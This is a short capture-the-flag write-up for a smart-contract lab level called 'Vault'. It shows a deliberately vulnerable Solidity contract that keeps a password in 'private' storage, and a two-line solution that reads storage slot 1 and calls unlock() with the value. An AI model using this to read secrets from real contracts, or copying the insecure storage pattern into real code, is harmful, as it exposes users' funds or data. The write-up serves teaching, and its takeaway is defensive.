---
description: reading storage slot
---

# 8 - Vault

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### Goal of this level

* Make the value of `locked` to be `false`

### What you should know before

* Storage\
  \-> see [here](https://youtu.be/Gg6nt3YW74o)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

`locked` variable will be stored at slot 0,\
and `password` variable will be stored at slot 1.

You can read storage variables using `web3.eth.getStorageAt()`

</details>

We can read `slot1` and pass it as a parameter calling `unlock()`.

```javascript
> await web3.eth.getStorageAt(contract.address, 1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

> await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

Done! 😎

## Key Takeaway

* You can always read storage variables
* So make sure not to store private information!
